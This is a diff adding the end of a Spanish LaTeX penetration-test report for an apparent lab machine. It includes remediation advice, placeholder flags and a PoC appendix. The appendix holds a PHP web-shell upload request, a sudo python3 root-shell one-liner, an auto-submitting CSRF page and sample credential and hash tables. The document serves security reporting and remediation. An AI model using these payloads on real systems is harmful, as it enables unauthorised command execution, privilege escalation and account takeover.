+    Revocar inmediatamente los permisos \path{NOPASSWD} para el usuario \path{www-data} en el archivo \path{/etc/sudoers}. El servicio web no debe tener capacidad para ejecutar intérpretes de comandos (Python, Perl, Bash) como root.
+    
+    \item \textbf{Rotación de Credenciales:} 
+    Dado que el sistema fue totalmente comprometido, se debe asumir que todas las credenciales almacenadas o tecleadas en el servidor han sido expuestas. Se requiere el cambio forzoso de contraseñas para usuarios administrativos y claves de conexión a bases de datos.
+\end{itemize}
+
+\subsection{Corto Plazo}
+\textit{Implementar en el próximo ciclo de mantenimiento o sprint de desarrollo (1-2 semanas).}
+
+\begin{itemize}
+    \item \textbf{Protección contra CSRF (VULN-\maquinaID-03):} 
+    Integrar librerías de seguridad en el desarrollo web que generen y validen tokens anti-CSRF en todos los formularios que realicen cambios de estado en el servidor.
+    
+    \item \textbf{Seguridad en Cookies (VULN-\maquinaID-05):} 
+    Configurar el servidor de aplicaciones para forzar los atributos \path{HttpOnly}, \path{Secure} y \path{SameSite=Strict} en todas las cookies de sesión para mitigar riesgos de robo de sesión vía XSS.
+    
+    \item \textbf{Ocultación de Información (VULN-\maquinaID-04):} 
+    Configurar el servidor web para minimizar la información expuesta en las cabeceras HTTP (\path{ServerTokens Prod} en Apache), dificultando la enumeración de versiones por parte de atacantes automatizados.
+\end{itemize}
+
+\subsection{Largo Plazo}
+\textit{Mejoras estructurales y de procesos para prevenir futuras intrusiones.}
+
+\begin{itemize}
+    \item \textbf{Implementación de WAF (Web Application Firewall):} 
+    Desplegar un WAF (como ModSecurity o soluciones en la nube) para detectar y bloquear intentos de subida de webshells y otros ataques comunes antes de que lleguen a la aplicación.
+    
+    \item \textbf{Monitoreo de Integridad de Archivos (FIM):} 
+    Implementar agentes de seguridad (como Wazuh, OSSEC o Tripwire) que alerten en tiempo real sobre la creación o modificación de archivos en directorios críticos del sistema y del servidor web.
+    
+    \item \textbf{Ciclo de Desarrollo Seguro (SSDLC):} 
+    Capacitar al equipo de desarrollo en prácticas de codificación segura (OWASP Top 10) y establecer revisiones de código estático (SAST) antes de cada despliegue a producción.
+\end{itemize}
+
+\clearpage
+
+% ==========================================
+% APÉNDICES
+% ==========================================
+\appendix
+
+% --- APÉNDICE A ---
+\section{Pruebas de Compromiso (Flags)}
+\label{appendix:flags}
+Documentación de identificadores únicos obtenidos.
+
+\subsection{Flag de Usuario}
+\begin{table}[H]
+    \centering
+    \begin{tabular}{|p{0.3\textwidth}|p{0.6\textwidth}|}
+
+        \hline
+        \textbf{Archivo} & 
+        \path{user.txt} \\ \hline
+
+        \textbf{Hash} & 
+        \path{a1b2c3d4e5f6...} \\ \hline
+
+        \textbf{Contexto} & 
+        \path{www-data} (Reverse Shell) \\ \hline
+
+    \end{tabular}
+\end{table}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.4\textwidth]{example-image-c}
+    \caption{Evidencia user.txt}
+\end{figure}
+
+\subsection{Flag de Administrador}
+\begin{table}[H]
+    \centering
+    \begin{tabular}{|p{0.3\textwidth}|p{0.6\textwidth}|}
+
+        \hline
+        \textbf{Archivo} & 
+        \path{root.txt} \\ \hline
+
+        \textbf{Hash} & 
+        \path{f6e5d4c3b2a1...} \\ \hline
+
+        \textbf{Contexto} & 
+        \path{root} (Sudo) \\ \hline
+
+    \end{tabular}
+\end{table}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.4\textwidth]{example-image-c}
+    \caption{Evidencia root.txt}
+\end{figure}
+
+\newpage
+
+% --- APÉNDICE B: POCs DETALLADOS ---
+\section{Proof Of Concept (PoC)}
+\label{appendix:pocs}
+
+En esta sección se detallan los scripts, peticiones HTTP y comandos específicos utilizados para validar las vulnerabilidades. Estos recursos permiten la reproducibilidad técnica de los hallazgos.
+
+\subsection{VULN-\maquinaID-01: Bypass de Carga de Archivos (Web Shell)}
+Para replicar la subida del archivo malicioso, se puede utilizar la siguiente petición HTTP cruda (Raw Request). Esta petición puede ser enviada mediante herramientas como Burp Suite Repeater o guardada en un archivo y enviada con \path{curl}.
+
+\begin{lstlisting}[language=bash, caption=Petición HTTP para subir la Web Shell]
+POST /contact.php HTTP/1.1
+Host: 10.10.11.245
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Content-Type: multipart/form-data; boundary=---------------------------36764789541813134671465227702
+
+-----------------------------36764789541813134671465227702
+Content-Disposition: form-data; name="name"
+
+Pentester
+-----------------------------36764789541813134671465227702
+Content-Disposition: form-data; name="file"; filename="exploit.php"
+Content-Type: application/x-php
+
+<?php 
+// Web Shell minimalista
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+}
+?>
+-----------------------------36764789541813134671465227702--
+\end{lstlisting}
+
+\textbf{Validación:} Una vez enviada la petición, navegar a:
+\begin{lstlisting}[language=bash]
+http://10.10.11.245/uploads/exploit.php?cmd=id
+\end{lstlisting}
+
+\subsection{VULN-\maquinaID-02: Escalada de Privilegios (Sudo)}
+El siguiente bloque de comandos muestra la secuencia exacta ejecutada en la terminal de la víctima para elevar privilegios de \path{www-data} a \path{root}.
+
+\begin{lstlisting}[language=bash, caption=Secuencia de comandos para escalada]
+# 1. Verificacion de permisos (Reconocimiento)
+www-data@host:/$ sudo -l
+# Salida esperada: (ALL) NOPASSWD: /usr/bin/python3
+
+# 2. Ejecucion del Exploit (GTFOBins)
+# Se invoca una shell del sistema (/bin/bash) a traves de Python con sudo
+www-data@host:/$ sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
+
+# 3. Confirmacion de identidad
+root@host:/# id
+uid=0(root) gid=0(root) groups=0(root)
+\end{lstlisting}
+
+\clearpage
+
+\subsection{VULN-\maquinaID-03: Explotación de CSRF (Generador de Formulario)}
+Dado que el formulario de contacto no tiene protección Anti-CSRF, un atacante podría alojar el siguiente código HTML en su propio servidor. Si un administrador autenticado visita este sitio, se enviará el formulario en su nombre sin su conocimiento.
+
+\begin{lstlisting}[language=html, caption=PoC HTML para ataque CSRF]
+<html>
+  <body>
+  <h1>You won a prize! Click here!</h1>
+    <script>history.pushState('', '', '/')</script>
+    <form action="http://10.10.11.245/contact.php" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="name" value="HackedByCSRF" />
+      <input type="hidden" name="file" value="archivo_dummy.txt" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      // Envio automatico del formulario al cargar la pagina
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+\end{lstlisting}
+
+\clearpage
+
+% --- APÉNDICE C ---
+\section{Inventario de Credenciales}
+\label{appendix:creds}
+
+\subsection{Credenciales de Servicios y Sistemas}
+Se han identificado las siguientes credenciales activas que permiten acceso a diversos servicios:
+
+\begin{table}[H]
+    \centering
+    \begin{tabularx}{\textwidth}{l l X l}
+        \toprule
+        \textbf{Servicio/Recurso} & 
+        \textbf{Usuario} & 
+        \textbf{Credencial (Pass/Key)} & 
+        \textbf{Privilegios} \\
+
+        \midrule
+        SSH (Puerto 22) & 
+        \path{root} & 
+        \path{P@ssw0rd123!} & 
+        Administrador \\
+
+        MySQL Database & 
+        \path{db_admin} & 
+        \path{admin_sql_2024} & 
+        Lectura/Escritura \\
+
+        Panel WordPress & 
+        \path{jdoe} & 
+        \path{flower123} & 
+        Editor \\
+        \bottomrule
+
+    \end{tabularx}
+    \caption{Tabla de credenciales de servicios identificadas}
+    \label{tab:servCreds}
+\end{table}
+
+\subsection{Usuarios de Base de Datos Comprometidos}
+A través de la explotación de vulnerabilidades en el aplicativo web, se obtuvo acceso a la tabla \path{users} de la base de datos. A continuación, una muestra de los datos exfiltrados:
+
+\begin{table}[H]
+    \centering
+    \begin{tabularx}{\textwidth}{c l l X}
+        \toprule
+        \textbf{ID} & 
+        \textbf{Username} & 
+        \textbf{Email} & 
+        \textbf{Hash / Password} \\
+
+        \midrule
+        1 & 
+        \path{admin} & 
+        \path{admin@empresa.local} & 
+        \path{\$2a\$10\$X... (bcrypt)} \\
+
+        2 & 
+        \path{soporte} & 
+        \path{help@empresa.local} & 
+        \path{5f4dcc3b5aa7... (MD5)} \\
+
+        3 & 
+        \path{invitado} & 
+        \path{guest@empresa.local} & 
+        \path{guest123} \\
+
+        \dots & 
+        \dots & 
+        \dots & 
+        \dots \\
+
+        \bottomrule
+
+    \end{tabularx}
+    \caption{Muestra de datos exfiltrados de la tabla 'users'}
+    \label{tab:dbCreds}
+\end{table}
+
+\subsection{Inventario de Hashes y Cracking}
+Se encontraron los siguientes hashes almacenados en el sistema. Se procedió a realizar ataques de fuerza bruta utilizando \textit{John the Ripper} y \textit{Hashcat}.
+
+\begin{table}[H]
+    \centering
+    \begin{tabularx}{\textwidth}{l X l l}
+        \toprule
+        \textbf{Origen} & 
+        \textbf{Hash (Truncado)} & 
+        \textbf{Algoritmo} & 
+        \textbf{Estado/Valor} \\
+
+        \midrule
+        /etc/shadow & 
+        \path{\$6\$wb7...} & 
+        SHA-512 & 
+        \textcolor{red}{\textbf{No Crackeado}} \\
+
+        DB Backup & 
+        \path{21232f297a57a5a7...} & 
+        MD5 & 
+        \path{admin} \\
+
+        Win SAM & 
+        \path{aad3b435b51404ee...} & 
+        NTLM & 
+        \path{qwerty} \\
+        \bottomrule
+
+    \end{tabularx}
+    \caption{Estado de descifrado de hashes encontrados}
+    \label{tab:hashes}
+\end{table}
+
+\clearpage
+
+% --- APÉNDICE D ---
+\section{Referencias}
+\label{appendix:references}
+
+A continuación se listan las herramientas, bases de datos de vulnerabilidades (CVEs) y documentación técnica consultada durante el proceso de auditoría para validar los hallazgos.
+
+\begin{table}[H]
+    \centering
+    \begin{tabularx}{\textwidth}{l l X} 
+        \toprule
+        \textbf{Categoría} & 
+        \textbf{Recurso / Título} & 
+        \textbf{Enlace o Fuente} \\
+
+        \midrule
+        CVE & 
+        CVE-2021-4034 (PwnKit) & 
+        \url{https://nvd.nist.gov/vuln/detail/CVE-2021-4034} \\
+
+        Exploit & 
+        POC PwnKit (Python) & 
+        \url{https://github.com/arthepsy/CVE-2021-4034} \\
+
+        Herramienta & 
+        LinPEAS & 
+        \url{https://github.com/carlospolop/PEASS-ng} \\
+
+        Técnica & 
+        GTFOBins (Sudo) & 
+        \url{https://gtfobins.github.io/gtfobins/sudo/} \\
+
+        Artículo & 
+        Bypass de UAC en Windows & 
+        \url{https://javierripoll.es/2025/06/14/bypass-uac-windows10-powershell/} \\
+        \bottomrule
+
+    \end{tabularx}
+    \caption{Listado de referencias técnicas y herramientas utilizadas}
+\end{table}
+
+\end{document}
